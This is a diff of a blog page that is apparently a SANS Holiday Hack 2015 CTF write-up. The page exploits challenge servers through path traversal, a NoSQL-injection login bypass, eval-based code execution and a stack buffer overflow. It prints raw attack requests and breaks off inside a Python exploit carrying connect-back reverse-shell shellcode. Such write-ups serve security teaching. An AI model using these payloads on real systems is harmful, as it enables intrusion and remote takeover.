 <p>The gnomes are apparently commanded by five SuperGnomes, which are the C&amp;C
 servers. How can we identify them? Jessica tells us that we can <em>sho Dan</em> the
 password information we found. It took me a while (shame on me) to understand
@@ -279,7 +306,7 @@ SuperGnomes:</p>
 <p>No flag for this part.</p>
 </div>
 <div class="section" id="part-4-theres-no-place-like-gnome-for-the-holidays-gnomage-pwnage">
-<h2>Part 4: There’s No Place Like Gnome for the Holidays: <em>Gnomage Pwnage</em></h2>
+<h2><a class="toc-backref" href="#id9">Part 4: There’s No Place Like Gnome for the Holidays: <em>Gnomage Pwnage</em></a></h2>
 <p>Now, it's time to compromise these SuperGnomes! To prove that we have control
 of the SuperGnomes, we must recover the content of
 <code>/gnome/www/files/gnome.conf</code>.</p>
@@ -299,7 +326,7 @@ any file.</p>
 <img alt="sg02_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_download_fail.png" />
 <p>However, there is a path traversal vulnerability in the web backend
 of the SuperGnome:</p>
-<div class="highlight"><pre><span class="c1">// File www/route/index.js, line 182</span>
+<div class="highlight"><pre><span></span><span class="c1">// File www/route/index.js, line 182</span>
 <span class="c1">// CAMERA VIEWER</span>
 <span class="c1">// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file</span>
 <span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/cam&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
@@ -324,7 +351,7 @@ only thing done to this parameter is that it is appended with the
 appended only if it is not previously found in the parameter. This means that
 if we find a directory with <code>.png</code> in its name, we can access any file.</p>
 <p>Fortunately, we can create a directory with an arbitray name:</p>
-<div class="highlight"><pre><span class="c1">// File www/route/index.js, line 127</span>
+<div class="highlight"><pre><span></span><span class="c1">// File www/route/index.js, line 127</span>
 <span class="c1">// SETTINGS UPLOAD</span>
 <span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/settings&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">sessions</span><span class="p">[</span><span class="nx">sessionid</span><span class="p">].</span><span class="nx">logged_in</span> <span class="o">===</span> <span class="kc">true</span> <span class="o">&amp;&amp;</span> <span class="nx">sessions</span><span class="p">[</span><span class="nx">sessionid</span><span class="p">].</span><span class="nx">user_level</span> <span class="o">&gt;</span> <span class="mi">99</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// AUGGIE: settings upload allowed for admins (admins are 100, currently)</span>
@@ -354,7 +381,7 @@ if we find a directory with <code>.png</code> in its name, we can access any fil
 <p>This time, the parameter without any sanitization is <code>filen</code>, which is
 the name of our new settings file. Since it's not sanitized, we can put
 special characters, like <code>/</code>:</p>
-<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/settings</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/settings</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">52.34.3.80</span>
 <span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0</span>
 <span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8</span>
@@ -371,7 +398,7 @@ filen=foo.png/foo&amp;file=bar
 <img alt="sg02_folder_creation_success.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_folder_creation_success.png" />
 <p>Then we can use the path traversal vulnerability to recover the configuration
 file:</p>
-<div class="highlight"><pre><span class="nf">GET</span> <span class="nn">/cam?camera=../upload/YoGjNkHo/foo.png/../../../../../../gnome/www/files/gnome.conf</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/cam?camera=../upload/YoGjNkHo/foo.png/../../../../../../gnome/www/files/gnome.conf</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">52.34.3.80</span>
 <span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0</span>
 <span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8</span>
@@ -380,7 +407,7 @@ file:</p>
 <span class="na">Cookie</span><span class="o">:</span> <span class="l">sessionid=jle7GDOGWl2hB4Upp5ry</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 </pre></div>
-<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
 <span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">GIYH::SuperGnome by AtnasCorp</span>
 <span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 20 Dec 2015 18:58:59 GMT</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
@@ -409,7 +436,7 @@ Files directory: /gnome/www/files/
 <p>That means that we have to bypass authentication somehow. The usual way is
 using an SQL injection. But since the DBMS is MongoDB, we can't use traditional
 SQL injection: we have to use NoSQL injection.</p>
-<div class="highlight"><pre><span class="c1">// File www/routes/index.js, line 105</span>
+<div class="highlight"><pre><span></span><span class="c1">// File www/routes/index.js, line 105</span>
 <span class="c1">// LOGIN POST</span>
 <span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">db</span><span class="p">;</span>
@@ -436,7 +463,7 @@ SQL injection: we have to use NoSQL injection.</p>
 converted to string before being used in the NoSQL query. This means that we
 can send our login parameters in JSON, and they will automatically be converted
 to a JavaScript object.</p>
-<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">52.64.191.71</span>
 <span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0</span>
 <span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8</span>
@@ -450,7 +477,7 @@ to a JavaScript object.</p>
 
 <span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&quot;$gt&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">}}</span>
 </pre></div>
-<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
+<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
 <span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">GIYH::SuperGnome by AtnasCorp</span>
 <span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">sessionid=5KriPZf9AP8l8MGBVpA8; Path=/</span>
 <span class="na">Location</span><span class="o">:</span> <span class="l">/</span>
@@ -463,7 +490,7 @@ password must be greater than an empty string. Since such a user exists, the
 application considers that we provided valid credentials, and happily opens
 an authenticated web session.</p>
 <p>We can then get the configuration file:</p>
-<div class="highlight"><pre><span class="nf">GET</span> <span class="nn">/files?d=gnome.conf</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/files?d=gnome.conf</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">52.64.191.71</span>
 <span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0</span>
 <span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8</span>
@@ -473,7 +500,7 @@ an authenticated web session.</p>
 <span class="na">Cookie</span><span class="o">:</span> <span class="l">sessionid=5KriPZf9AP8l8MGBVpA8</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 </pre></div>
-<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
 <span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">GIYH::SuperGnome by AtnasCorp</span>
 <span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 20 Dec 2015 22:44:57 GMT</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
@@ -502,7 +529,7 @@ However, when we try to download the gnome.conf file from the
 files tab, we get an error message:</p>
 <img alt="sg04_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg04_download_fail.png" />
 <p>Fortunately for us, this SuperGnome suffers from a remote code execution:</p>
-<div class="highlight"><pre><span class="c1">// File www/routes/index.js, line 153</span>
+<div class="highlight"><pre><span></span><span class="c1">// File www/routes/index.js, line 153</span>
 <span class="c1">// FILES UPLOAD</span>
 <span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/files&#39;</span><span class="p">,</span> <span class="nx">upload</span><span class="p">.</span><span class="nx">single</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">),</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">sessions</span><span class="p">[</span><span class="nx">sessionid</span><span class="p">].</span><span class="nx">logged_in</span> <span class="o">===</span> <span class="kc">true</span> <span class="o">&amp;&amp;</span> <span class="nx">sessions</span><span class="p">[</span><span class="nx">sessionid</span><span class="p">].</span><span class="nx">user_level</span> <span class="o">&gt;</span> <span class="mi">99</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// NEDFORD: this should be 99 not 100 so admins can upload</span>
@@ -536,7 +563,7 @@ files tab, we get an error message:</p>
 <code>eval</code> s some code sent by us. Whoopsie! We can send arbitrary JavaScript
 code, and it will be executed by the server. This means that we can send code
 to read the configuration file:</p>
-<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/files</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/files</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">52.192.152.132</span>
 <span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0</span>
 <span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8</span>
@@ -560,7 +587,7 @@ foo
 
 -----------------------------1090026508808451371305736143--
 </pre></div>
-<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
 <span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">GIYH::SuperGnome by AtnasCorp</span>
 <span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=utf-8</span>
 <span class="na">Content-Length</span><span class="o">:</span> <span class="l">4208</span>
@@ -568,10 +595,10 @@ foo
 <span class="na">Date</span><span class="o">:</span> <span class="l">Sat, 26 Dec 2015 23:41:46 GMT</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 
-<span class="cp">&lt;!DOCTYPE html&gt;</span><span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>GIYH::ADMIN PORT V.01<span class="nt">&lt;/title&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">title</span><span class="p">&gt;</span>GIYH::ADMIN PORT V.01<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
 [snip]
-<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">&quot;nav navbar-nav&quot;</span><span class="nt">&gt;&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/&quot;</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/cameras&quot;</span><span class="nt">&gt;</span>Cameras<span class="nt">&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/files&quot;</span><span class="nt">&gt;</span>Files<span class="nt">&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/gnomenet&quot;</span><span class="nt">&gt;</span>GnomeNET<span class="nt">&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/settings&quot;</span><span class="nt">&gt;</span>Settings<span class="nt">&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/?logout=1&quot;</span><span class="nt">&gt;</span>Logout<span class="nt">&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/nav&gt;&lt;div</span> <span class="na">class=</span><span class="s">&quot;jumbotron&quot;</span><span class="nt">&gt;&lt;h1&gt;</span>Files<span class="nt">&lt;/h1&gt;&lt;p</span> <span class="na">class=</span><span class="s">&quot;message&quot;</span><span class="nt">&gt;</span>Upload successful.<span class="nt">&lt;/p&gt;&lt;p</span> <span class="na">class=</span><span class="s">&quot;message&quot;</span><span class="nt">&gt;</span>Executing post process...<span class="nt">&lt;/p&gt;</span>
-<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">&quot;message&quot;</span><span class="nt">&gt;</span>Post process result: Gnome Serial Number: BU22_1729_2716057
+<span class="p">&lt;</span><span class="nt">ul</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;nav navbar-nav&quot;</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/&quot;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/cameras&quot;</span><span class="p">&gt;</span>Cameras<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/files&quot;</span><span class="p">&gt;</span>Files<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/gnomenet&quot;</span><span class="p">&gt;</span>GnomeNET<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/settings&quot;</span><span class="p">&gt;</span>Settings<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/?logout=1&quot;</span><span class="p">&gt;</span>Logout<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;/</span><span class="nt">ul</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">nav</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;jumbotron&quot;</span><span class="p">&gt;&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Files<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;message&quot;</span><span class="p">&gt;</span>Upload successful.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;message&quot;</span><span class="p">&gt;</span>Executing post process...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;message&quot;</span><span class="p">&gt;</span>Post process result: Gnome Serial Number: BU22_1729_2716057
 Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
 Allow new subordinates?: YES
 Camera monitoring?: YES
@@ -583,7 +610,7 @@ Allow file uploads?: YES
 Allowed file formats: .png
 Allowed file size: 512kb
 Files directory: /gnome/www/files/
-<span class="nt">&lt;/p&gt;&lt;p</span> <span class="na">class=</span><span class="s">&quot;message&quot;</span><span class="nt">&gt;</span>File pending Nedfords approval.<span class="nt">&lt;/p&gt;</span>[snip]
+<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;message&quot;</span><span class="p">&gt;</span>File pending Nedfords approval.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>[snip]
 </pre></div>
 <img alt="sg04_w00t.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg04_w00t.png" />
 <p>The flag for this SuperGnome is <code>BU22_1729_2716057</code>
@@ -595,35 +622,35 @@ Files directory: /gnome/www/files/
 web interface, but in a network service run by the SuperGnome. If we
 take a look at the result of a <code>nmap</code> command, we can see that
 we can connect to the SuperGnome on the port 4242:</p>
-<div class="highlight"><pre><span class="nv">$ </span>nmap 54.233.105.81
+<div class="highlight"><pre><span></span><span class="gp">$</span> nmap <span class="m">54</span>.233.105.81
 
-Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2016-01-09 10:55 CET
-Nmap scan report <span class="k">for</span> ec2-54-233-105-81.sa-east-1.compute.amazonaws.com <span class="o">(</span>54.233.105.81<span class="o">)</span>
-Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
-Not shown: <span class="m">997</span> filtered ports
-PORT     STATE  SERVICE
-80/tcp   open   http
-4242/tcp open   vrml-multi-use
-5555/tcp closed freeciv
+<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-09 10:55 CET</span>
+<span class="go">Nmap scan report for ec2-54-233-105-81.sa-east-1.compute.amazonaws.com (54.233.105.81)</span>
+<span class="go">Host is up (0.30s latency).</span>
+<span class="go">Not shown: 997 filtered ports</span>
+<span class="go">PORT     STATE  SERVICE</span>
+<span class="go">80/tcp   open   http</span>
+<span class="go">4242/tcp open   vrml-multi-use</span>
+<span class="go">5555/tcp closed freeciv</span>
 
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.17 seconds
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds</span>
 </pre></div>
 <p>Let's connect to it using <code>netcat</code>:</p>
-<div class="highlight"><pre><span class="nv">$ </span>nc 54.233.105.81 4242
+<div class="highlight"><pre><span></span><span class="gp">$</span> nc <span class="m">54</span>.233.105.81 <span class="m">4242</span>
 
-Welcome to the SuperGnome Server Status Center!
-Please enter one of the following options:
+<span class="go">Welcome to the SuperGnome Server Status Center!</span>
+<span class="go">Please enter one of the following options:</span>
 
-<span class="m">1</span> - Analyze hard disk usage
-<span class="m">2</span> - List open TCP sockets
-<span class="m">3</span> - Check logged in users
+<span class="go">1 - Analyze hard disk usage</span>
+<span class="go">2 - List open TCP sockets</span>
+<span class="go">3 - Check logged in users</span>
 </pre></div>
 <p>Ok, this seems to be a service to get some informations about
 the SuperGnomes. Let's see if we have a copy of the binary
 in our copy of the firmware</p>
-<div class="highlight"><pre><span class="nv">$ </span>grep -Rn <span class="s2">&quot;Welcome to the SuperGnome Server Status Center&quot;</span> .
+<div class="highlight"><pre><span></span><span class="gp">$</span> grep -Rn <span class="s2">&quot;Welcome to the SuperGnome Server Status Center&quot;</span> .
 
-Fichier binaire ./usr/bin/sgstatd correspondant
+<span class="go">Fichier binaire ./usr/bin/sgstatd correspondant</span>
 </pre></div>
 <p>Ok, so the binary program listening on the port 4242 seems to
 be <code>/usr/bin/sgstatd</code>. If we look carefully, we can
@@ -633,7 +660,7 @@ find the source for such a program on SuperGnome01:</p>
 (sha256: <code>2343ce7345b960144fcb39ca01c2cf406e6db9a7847eaae6361d69ef5169d4e4</code>).</p>
 <p>Now let's look at the source code, and see where our input
 are being processed (I cleaned it up a bit):</p>
-<div class="highlight"><pre><span class="c1">// File sgstatd.c, line 21</span>
+<div class="highlight"><pre><span></span><span class="c1">// File sgstatd.c, line 21</span>
 <span class="k">if</span> <span class="p">(</span><span class="n">choice</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">write</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Welcome to the SuperGnome Server Status Center!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">51</span><span class="p">);</span>
     <span class="n">write</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="s">&quot;Please enter one of the following options:</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">45</span><span class="p">);</span>
@@ -688,7 +715,7 @@ are being processed (I cleaned it up a bit):</p>
 <p>There seems to be a hidden command when we input <code>88</code>, which is the
 ASCII code of the letter <code>X</code>. If we input <code>X</code>, the function
 <code>sgstatd</code> is called. Let's take a look at it:</p>
-<div class="highlight"><pre><span class="c1">// File sgstatd.c, line 138</span>
+<div class="highlight"><pre><span></span><span class="c1">// File sgstatd.c, line 138</span>
 <span class="kt">int</span> <span class="nf">sgstatd</span><span class="p">(</span><span class="n">sd</span><span class="p">)</span>
 <span class="p">{</span>
 <span class="hll">    <span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl $0xe4ffffe4, -4(%ebp)&quot;</span><span class="p">);</span>
@@ -713,9 +740,9 @@ you say buffer-overflow!</p>
 <p>Let's take a look at the binary, to see what kind of security it as. i'm
 using the <code>checksec.sh</code> (available
 <a class="reference external" href="https://github.com/slimm609/checksec.sh">here</a>) script to do so:</p>
-<div class="highlight"><pre><span class="nv">$ </span>/checksec --file sgstatd
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No  <span class="m">0</span>       <span class="m">8</span>   sgstatd
+<div class="highlight"><pre><span></span><span class="gp">$</span> /checksec --file sgstatd
+<span class="go">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE</span>
+<span class="go">No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No  0       8   sgstatd</span>
 </pre></div>
 <p>Now, make sure you run the script on the binary from the firmware, and not
 on a binary you compiled from the source code.</p>
@@ -730,91 +757,91 @@ have this value in our final payload.</p>
 the flow of execution on the stack. The opcode for such an instruction is
 <code>ff e4</code>. If this value is familiar, it's because it's used in the custom
 stack canary (clever organizers)!</p>
-<div class="highlight"><pre><span class="nv">$ </span>objdump -M intel -d sgstatd <span class="p">|</span> grep <span class="s2">&quot;ff e4&quot;</span>
- 8049366:   c7 <span class="m">45</span> <span class="nb">fc </span>e4 ff ff e4    mov    DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>,0xe4ffffe4
- 80493b2:   <span class="m">81</span> f2 e4 ff ff e4       xor    edx,0xe4ffffe4
+<div class="highlight"><pre><span></span><span class="gp">$</span> objdump -M intel -d sgstatd <span class="p">|</span> grep <span class="s2">&quot;ff e4&quot;</span>
+<span class="go"> 8049366:   c7 45 fc e4 ff ff e4    mov    DWORD PTR [ebp-0x4],0xe4ffffe4</span>
+<span class="go"> 80493b2:   81 f2 e4 ff ff e4       xor    edx,0xe4ffffe4</span>
 </pre></div>
 <p>So, our <code>jmp esp</code> gadget is available at the address <code>0x0804936b</code>.
 Let's see the exploit code:</p>
-<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
 
 <span class="kn">import</span> <span class="nn">socket</span>
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="c"># This is a connect-back shellcode, configured to connect back</span>
-    <span class="c"># to a server I own, on the port 8080.</span>
-    <span class="c"># Thanks to http://shell-storm.org/shellcode/</span>
+    <span class="c1"># This is a connect-back shellcode, configured to connect back</span>
+    <span class="c1"># to a server I own, on the port 8080.</span>
+    <span class="c1"># Thanks to http://shell-storm.org/shellcode/</span>
     <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">str</span><span class="p">()</span>
-    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1</span><span class="s">&#39;</span>
-    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\xcd\x80\x92\xb0\x66\x68\x51\x39\x0B\x02\x66\x68\x1f\x90</span><span class="s">&#39;</span>
-    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80</span><span class="s">&#39;</span>
-    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b</span><span class="s">&#39;</span>
-    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">&#39;</span>
-    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x89\xe3\xcd\x80</span><span class="s">&#39;</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1</span><span class="s1">&#39;</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xcd\x80\x92\xb0\x66\x68\x51\x39\x0B\x02\x66\x68\x1f\x90</span><span class="s1">&#39;</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80</span><span class="s1">&#39;</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b</span><span class="s1">&#39;</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s1">&#39;</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x89\xe3\xcd\x80</span><span class="s1">&#39;</span>
 
